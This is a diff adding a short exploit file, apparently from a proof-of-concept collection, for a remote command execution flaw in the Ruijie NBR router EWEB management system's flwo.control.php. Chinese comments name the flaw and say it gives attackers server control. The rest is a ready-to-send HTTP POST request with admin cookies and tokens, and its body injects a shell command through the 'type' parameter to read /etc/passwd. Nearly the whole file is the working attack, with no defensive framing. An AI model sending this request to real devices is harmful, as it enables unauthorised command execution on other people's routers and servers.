@@ -1,0 +1,11 @@
+# 锐捷EWEB网管系统flwo.control.php远程命令执行漏洞
+# 锐捷NBR路由器EWEB网管系统存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。
+POST /flow_control_pi/flwo.control.php?a=getFlowGroup&acid=80051550&bid=hd_tag_m8mv245z HTTP/1.1
+Host: www.swaf.com
+Cookie: RUIJIEID=q6g97tqc32rl4bl8h89gjub031; user=admin;
+RM-PRO-BusinessID: hd_tag_m8mv245z
+RM-PRO-Token: 11bbb440fd68e5f64573a4d744b2551c
+RM-PRO-Time: 1742808365559
+User-Agent: curl/7.83.1
+
+type=|bash -c 'cat /etc/passwd'
